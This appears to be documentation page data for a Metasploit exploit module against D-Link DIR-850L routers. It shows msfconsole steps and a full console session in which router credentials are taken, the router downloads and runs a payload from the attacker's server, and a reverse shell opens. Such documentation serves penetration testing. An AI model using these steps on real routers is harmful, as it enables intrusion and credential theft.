{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/dlink_dir850l_unauth_exec","result":{"data":{"moduleMetadataJson":{"id":"0d2fa784-7181-5061-87a4-7d26e650fe2b","name":"DIR-850L (Un)authenticated OS Command Exec","fullname":"exploit/linux/http/dlink_dir850l_unauth_exec","description":"This module leverages an unauthenticated credential disclosure\n        vulnerability to then execute arbitrary commands on DIR-850L routers\n        as an authenticated user. Unable to use Meterpreter payloads.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/dlink_dir850l_unauth_exec","documentationSlug":"/modules/documentation/exploit/linux/http/dlink_dir850l_unauth_exec","referencesSlug":"/modules/references/exploit/linux/http/dlink_dir850l_unauth_exec"},"documentation":{"html":"<p>The module dlink<em>dir850</em>(un)auth_exec leverages an unauthenticated credential disclosure vulnerability to then execute arbitrary commands via an authenticated OS command injection\nvulnerability. D-LINK 850L (excluding \"Cloud\" models) devices with firmware version up to 1.14B07\nare potentially vulnerable. The vulnerability seems to occur within the parsing of the config. Another PoC can be found here <a href=\"https://www.seebug.org/vuldb/ssvid-96333\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.seebug.org/vuldb/ssvid-96333</a>. Setting command to be <code class=\"language-text\">reboot</code> will force the router into an infinite loop.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do : <code class=\"language-text\">use exploit/linux/http/dlink_dir850l_unauth_exec.rb</code></li>\n<li>Do : <code class=\"language-text\">set RHOST [RouterIP]</code></li>\n<li>Do : <code class=\"language-text\">set PAYLOAD linux/mipsbe/shell/reverse_tcp</code></li>\n<li>Do : <code class=\"language-text\">run</code></li>\n<li>If router is vulnerable, payload should be dropped via wget and executed, and therein should obtain an session</li>\n</ol>\n<h2 id=\"example\" style=\"position:relative;\"><a href=\"#example\" aria-label=\"example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/dlink_dir850l_unauth_exec\nmsf exploit(dlink_dir850l_unauth_exec) &gt; set RHOST 192.168.0.14\nRHOST =&gt; 192.168.0.14\nmsf exploit(dlink_dir850l_unauth_exec) &gt; set RPORT 80\nRPORT =&gt; 80\nmsf exploit(dlink_dir850l_unauth_exec) &gt; check\n[*] 192.168.0.14:80 The target service is running, but could not be validated.\nmsf exploit(dlink_dir850l_unauth_exec) &gt; set VERBOSE true\nVERBOSE =&gt; true\nmsf exploit(dlink_dir850l_unauth_exec) &gt; set LHOST ens3\nLHOST =&gt; ens3\nmsf exploit(dlink_dir850l_unauth_exec) &gt; set LPORT 3131\nLPORT =&gt; 3131\nmsf exploit(dlink_dir850l_unauth_exec) &gt; run\n\n[*] Started reverse TCP handler on 192.168.0.11:3131\n[*] 192.168.0.14:80 - Connecting to target...\n[+] 192.168.0.14:80 - Retrieved the username/password combo Admin/92830535\n[+] 192.168.0.14:80 - Downloaded credentials to /root/.msf4/loot/20171104113614_default_192.168.0.14_dlink.dir850l.lo_146186.txt\n[*] 192.168.0.14:80 - Starting up web service http://192.168.0.11:8080/ZUrlVeWUm\n[*] Using URL: http://0.0.0.0:8080/ZUrlVeWUm\n[*] Local IP: http://192.168.0.11:8080/ZUrlVeWUm\n[*] 192.168.0.14:80 - Asking target to request to download http://192.168.0.11:8080/ZUrlVeWUm\n[*] 192.168.0.14:80 - Waiting for target to request the ELF payload...\n[*] 192.168.0.14:80 - Sending payload to the server...\n[*] 192.168.0.14:80 - Requesting device to chmod ZUrlVeWUm\n[*] 192.168.0.14:80 - Requesting device to execute ZUrlVeWUm\n[*] 192.168.0.14:80 - Waiting 10 seconds for shell to connect back to us...\n[*] Sending stage (84 bytes) to 192.168.0.14\n[*] Command shell session 1 opened (192.168.0.11:3131 -&gt; 192.168.0.14:43953) at 2017-11-04 11:36:26 -0400\n[+] Deleted /tmp/uoskutcy\n[-] Exploit aborted due to failure: unknown: 192.168.0.14:80 - Shell never connected to us!, disconnect?\n[*] Server stopped.\n[*] Exploit completed, but no session was created.\nmsf exploit(dlink_dir850l_unauth_exec) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\n190745749\nwUVNdEKSrgeaxdSQyfTyxvaoYgFzyvGj\ntrue\npQfaUhhwMvgnWrLpQXhhUAioNBFHPRZP\nOgkEaOTPYbUEOLlLpLFEbodBvHFmVRmH\niNaYBrmsZqFyolPWWRKEHsKglrSlSGkY\npwd\n/</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"0d2fa784-7181-5061-87a4-7d26e650fe2b"}}}